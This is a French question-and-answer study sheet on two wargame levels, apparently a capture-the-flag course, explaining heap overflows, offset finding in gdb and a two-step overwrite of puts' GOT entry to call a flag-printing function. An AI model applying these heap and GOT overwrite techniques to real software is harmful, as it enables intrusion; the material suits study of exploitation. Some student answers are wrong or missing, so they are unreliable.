**Le buffer fait 64 bytes (malloc(0x40)). Pourquoi l'offset est 72 et pas 64 ?**

il y a 8 bits de metadonnees de la heap

**Que représentent les 8 bytes supplémentaires ?**

Chaque bloc `malloc()` est précédé d'un **header** qui contient :
```
┌─────────────────────────────────────────┐
│ Header (8 bytes) :                      │
│   - Taille du bloc (4 bytes)            │
│   - Flags (4 bytes)                     │
├─────────────────────────────────────────┤
│ Données (malloc(0x40) = 64 bytes)       │
└─────────────────────────────────────────┘
```

**Comment as-tu confirmé que 72 était le bon offset ?**

```bash
gdb level6
(gdb) run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"')
(gdb) info registers eip
# eip = 0x63413663 → chercher dans le pattern → position 72
```


**5 : Différence avec les niveaux précédents**



**Dans level1/2, on écrasait EIP (adresse de retour). Ici qu'écrase-t-on ?**
```
Level1/2 :
STACK : [buffer][...][saved EIP] ← On écrase ça
Au ret : EIP = notre adresse

Level6 :
HEAP  : [__dest 64b][header 8b][puVar1] ← On écrase ça
À l'appel : (*puVar1)() = notre adresse
```

**Pourquoi n'a-t-on pas besoin de ; cat ici ?**

pas besoin de faire tourne un sh en continu

**Pourquoi l'argument est passé via argv et non via stdin comme avant ?**

je ne sais pas


## 🎯 Questions de compréhension - Level7
### 1 : La structure du heap
Le code fait 4 malloc() consécutifs :
cpuVar1 = malloc(8);   // Struct A
pvVar2 = malloc(8);   // Buffer A
puVar3 = malloc(8);   // Struct B
pvVar2 = malloc(8);   // Buffer B


**Dessine le layout du heap après ces 4 allocations (comme on a fait en level6).**

trop long fais le

**Pourquoi puVar1[1] = pvVar2 ? Qu'est-ce que ça crée comme structure ?**

ca fait un poitner qui pointe vers un pointeur, comme un eliste chainee en quelque sorte

**Quand strcpy((char *)puVar1[1], argv[1]) s'exécute, où écrit-on exactement ?**

dans la heap



### 2 : La stratégie d'exploitation
La stratégie est en 2 étapes avec 2 argv :

argv[1] : Overflow Buffer A → écrase le pointeur de Struct B
argv[2] : Écrit l'adresse de m() dans la GOT de puts()



**Explique avec tes mots ce que fait argv[1].**

argv[1] = Outil de visée  → Redirige le 2ème strcpy vers la GOT

**Explique avec tes mots ce que fait argv[2].**

argv[2] = La balle        → Écrit l'adresse de m() dans la GOT

**Pourquoi a-t-on besoin de deux arguments pour cette exploitation ?**

**Sans argv[1]** : Le 2ème strcpy écrit dans Buffer B (inoffensif).
**Sans argv[2]** : Rien n'est écrit dans la GOT.



### 3 : Le mécanisme en chaîne


**Après l'overflow d'argv[1], que contient puVar3[1] ?**

```
Avant argv[1] : puVar3[1] = 0x0804a038 (Buffer B)
Après argv[1] : puVar3[1] = 0x08049928 (GOT de puts)
```
**On a remplacé le pointeur vers Buffer B par le pointeur vers la GOT !**

**Quand strcpy((char *)puVar3[1], argv[2]) s'exécute, où écrit-on ?**

```
puVar3[1] = 0x08049928 (GOT de puts)
strcpy(0x08049928, argv[2])
→ Écrit argv[2] à l'adresse 0x08049928
→ GOT[puts] = adresse de m() ✅
```

**Pourquoi écrire l'adresse de m() dans la GOT de puts() ?**

pour remplacer puts par m()
```
puts("~~") est appelé dans le code
→ CPU cherche l'adresse dans GOT[puts]
→ GOT[puts] = adresse de m() (notre overwrite)
→ m() s'exécute à la place de puts()
→ m() affiche le flag ! ✅
```


### 4 : L'offset de 20
Tu trouves un offset de 20 bytes.


**Buffer A fait 8 bytes (malloc(8)). Pourquoi l'offset est 20 et pas 8 ?**

pour les metadonnees

**Décompose les 20 bytes : que représente chaque partie ?**

```
De Buffer A (0x0804a018) jusqu'à puVar3[1] (0x0804a02c) :

0x0804a018   Buffer A        (8 bytes) ← strcpy commence ici
0x0804a020   Header Struct B (8 bytes) ← Métadonnées malloc
0x0804a028   puVar3[0]       (4 bytes) ← Valeur "2" (on s'en fout)
0x0804a02c   puVar3[1]       (4 bytes) ← CIBLE ! On veut écraser ça
```

**Total** :
```
8 (Buffer A) + 8 (header Struct B) + 4 (puVar3[0]) = 20 bytes ✅
```

**Pourquoi doit-on écraser puVar3[1] et pas puVar3[0] ?**

```c
puVar3[0] = 2;                    // Juste une valeur (jamais utilisée après)
puVar3[1] = adresse de Buffer B;  // Le POINTEUR utilisé par strcpy !
```



### 5 : La variable globale c
Le flag est lu dans c avec fgets() avant d'appeler puts().


**Pourquoi le flag est-il dans c au moment où m() s'exécute ?**



**Pourquoi ne pas lire directement le fichier .pass avec m() ?**

impossible

**m() affiche c avec un timestamp. Pourquoi le timestamp ?**

je ne sais pas, osef



### 6 : Comparaison avec level6


**Dans level6, on écrasait directement func_ptr. Ici, c'est en 2 étapes. Explique la différence.**

#### Différence level6 vs level7

**Level6** : Exploitation **directe** en 1 étape
```
Buffer → [overflow] → func_ptr
                         ↓
                      Pointe vers n()
```

**Level7** : Exploitation **indirecte** en 2 étapes (double indirection)
```
Étape 1 : Buffer A → [overflow] → puVar3[1]
                                      ↓
                               Pointe vers GOT[puts]

Étape 2 : strcpy utilise puVar3[1] → Écrit dans GOT[puts]
                                              ↓
                                       = adresse m()
```

**En level6** : On contrôle directement ce qui est appelé.
**En level7** : On contrôle un pointeur qui contrôle où on écrit, puis on écrit une adresse.


**Dans level6, on ciblait une fonction jamais appelée (n()). Ici on cible puts() dans la GOT. Pourquoi cette différence ?**

dis le moi

**Pourquoi cette technique est-elle plus complexe que level6 ?**

dis le moi

